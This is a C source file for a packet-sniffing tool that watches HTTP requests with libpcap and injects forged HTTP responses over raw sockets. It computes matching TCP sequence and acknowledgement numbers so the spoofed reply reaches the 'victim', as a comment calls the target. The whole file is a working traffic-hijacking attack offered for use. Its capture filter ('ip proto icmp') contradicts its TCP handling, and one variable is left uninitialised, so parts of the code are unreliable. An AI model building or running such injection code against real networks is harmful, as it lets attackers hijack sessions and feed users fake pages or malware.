#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <inttypes.h>

#include "decode-ethernet.h"
#include "decode-udp.h"
#include "decode-icmpv4.h"
#include "decode-http.h"
#include "config.h"
#include "util-logger.h"
#include "checksum.h"

#define MAX_FILE_SIZE 2000

AttackConfig *config;

void send_raw_ip_packet(int sock, u_char *ip, int n, struct sockaddr_in dstInfo) {
	int r = sendto(sock , ip, n , 0 , (struct sockaddr *) &dstInfo, sizeof (dstInfo));
	if (r > 0) printf( " Sent a packet of size : %d\n ", r) ;
	else printf( "Failed to send packet.\n" ) ;
}

void spoof_reply_http(ipheader *ip) {
	int IP_HEADER_LEN = ip -> iph_ihl * 4;
	tcpheader *tcpReceive = (tcpheader *) ((u_char *)ip + IP_HEADER_LEN);

	int enable = 1;
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt(sock , IPPROTO_IP , IP_HDRINCL , &enable, sizeof(enable));
	
	/* Read template of IP packet*/
	FILE *f = fopen( "http.bin", "rb");
	if (!f) {
		perror( " Can't open 'http.bin'");
		exit (0);
	}

	unsigned char ipData[MAX_FILE_SIZE];
	int n = fread (ipData , 1, MAX_FILE_SIZE, f);

	/* Swap src and dst info */		
	printf("Receive dest port %d \n",ntohs(tcpReceive->th_dport));
	printf("Reveive source port %d \n",ntohs(tcpReceive->th_sport));
	printf("seq %" PRIu32 "\n",ntohl(tcpReceive -> th_seq));
	printf("ack %" PRIu32 "\n",ntohl(tcpReceive -> th_ack));

	/* Re-calculate sequence number and ack number */
	ipheader *ipSend = (ipheader *)ipData;
	(ipSend -> iph_srcip).s_addr = (ip->iph_dstip).s_addr;
	(ipSend -> iph_dstip).s_addr = (ip->iph_srcip).s_addr;
	int IP_HEADER_SEND_LEN = ipSend -> iph_ihl * 4;
	tcpheader *tcpSend = (tcpheader *) ((u_char *)ipData + IP_HEADER_SEND_LEN);
	
	/* Re-calculate sequence number and ack number */
	tcpSend -> th_sport = tcpReceive->th_dport; // Swap src and dst port 
	tcpSend -> th_dport = tcpReceive->th_sport;

	/* New sequence number = received ack number*/
	tcpSend ->  th_seq = tcpReceive -> th_ack;

	/* New ACK number= received sequence number + TCP payload length */
	uint8_t TCP_HEADER_LEN2 =  tcpReceive->th_offx2 >> 4;
	TCP_HEADER_LEN2 = TCP_HEADER_LEN2 * 4;
	//u_char *payloadReceive = (u_char *) ((u_char *)tcpReceive + TCP_HEADER_LEN2);
	
	//uint32_t payloadLen = strlen((char *) payloadReceive);
	uint32_t payloadLen = ntohs(ip->iph_len) - IP_HEADER_LEN - TCP_HEADER_LEN2;
	//printf("%02x \n",payloadReceive[0]);
	//printf("%02x \n",payloadReceive[payloadLen -1]);
	tcpSend -> th_ack = htonl(ntohl(tcpReceive -> th_seq) + payloadLen); 

	printf("payload length %" PRIu32 "\n", payloadLen);
	printf("respond seq %" PRIu32 "\n", ntohl(tcpSend -> th_seq));
	printf("respond ack %" PRIu32 "\n", ntohl(tcpSend -> th_ack));

	/* Dst info to send by raw socket*/
	struct sockaddr_in dstInfo;
	dstInfo.sin_family = AF_INET;
	dstInfo.sin_addr.s_addr = (ipSend -> iph_dstip).s_addr;
	//dstInfo.sin_port = tcpReceive->th_sport;

	/* Re-calculate TCP checksum */
	tcpSend -> th_sum = calculate_tcp_checksum((ipheader *) ipData);

	/*send sproof IP packet to victim*/
	send_raw_ip_packet(sock, ipData , n, dstInfo);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	ethheader *eth = (ethheader *) packet;
	if (ntohs(eth-> ether_type) == 0x0800) {	// ip packet
		ipheader *ip = (ipheader *) ((u_char *)packet + ETHERNET_HEADER_LEN);
		int IP_HEADER_LEN = ip -> iph_ihl * 4;
		//int IP_HEADER_LEN  = 20;
		switch (ip->iph_proto) {
			case IPPROTO_TCP:	;// TCP protocol
				//printf("TCP\n");
				tcpheader *tcp = (tcpheader *) ((u_char *)packet + ETHERNET_HEADER_LEN + IP_HEADER_LEN);
				uint8_t TCP_HEADER_LEN2 =  tcp->th_offx2 >> 4;
				TCP_HEADER_LEN2 = TCP_HEADER_LEN2 * 4;
				char * data = (char *) ((u_char *)tcp + TCP_HEADER_LEN2);
				char match = 1;
				if (config->dport && ntohs(tcp->th_dport) != config->dport) match = 0;
				else if (config->dst[0] != '\0') {
					char str[INET_ADDRSTRLEN];
					inet_ntop(AF_INET, &(ip->iph_dstip), str, INET_ADDRSTRLEN);
					//printf("Extract IP %s\n", str);
					if (strcmp(str, config->dst)) match = 0;
					//else printf("Match!!\n");				
				}
				if (match && data != NULL && strlen((char *) data) > 10) {
					//printf("Parse HTTP\n");
					httprequest *request = parseRequest(data);
					//printf("Parse HTTP2\n");
					if (request != NULL && request->host != NULL) {
						if (config->host[0] != '\0' && strcmp(request->host, config->host)) match = 0;
						if (match) {
							//printf("Fake respond!\n");
							spoof_reply_http(ip);
						}

					}
					free(request);
				}

				break;

			case IPPROTO_UDP: ;
				//udpheader *udp = (udpheader *) (packet + ETHERNET_HEADER_LEN + IP_HEADER_LEN);
				break;

			case IPPROTO_ICMP: ;
				//icmpheader *icmp = (icmpheader *) (packet + ETHERNET_HEADER_LEN + IP_HEADER_LEN);
				break;

			default:
				break;
		}
	} 
}

int main(int argc, char const *argv[])
{
	pcap_t *handle;
	char errbuff[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	char filter_exp[] ="ip proto icmp";
	bpf_u_int32 net;
	printf("Kien's tool: A tool for capturing HTTP Request and sproofing HTTP respond\n");
	printf("Warning: This tool must run as root user\n");
	printf("Version 1.0\n");
	printf("================================================\n");
	config = parseConfig(argc, argv);
	if (config == NULL || config->interface == NULL) return 1;
	printf("Running in interface %s!\n", config->interface);
	handle = pcap_open_live(config->interface, BUFSIZ, 1, 100, errbuff);
	pcap_compile(handle, &fp, filter_exp, 0, net);
	pcap_setfilter(handle, &fp);
	pcap_loop(handle, -1, got_packet, NULL);
	pcap_close(handle);
	return 0;
}





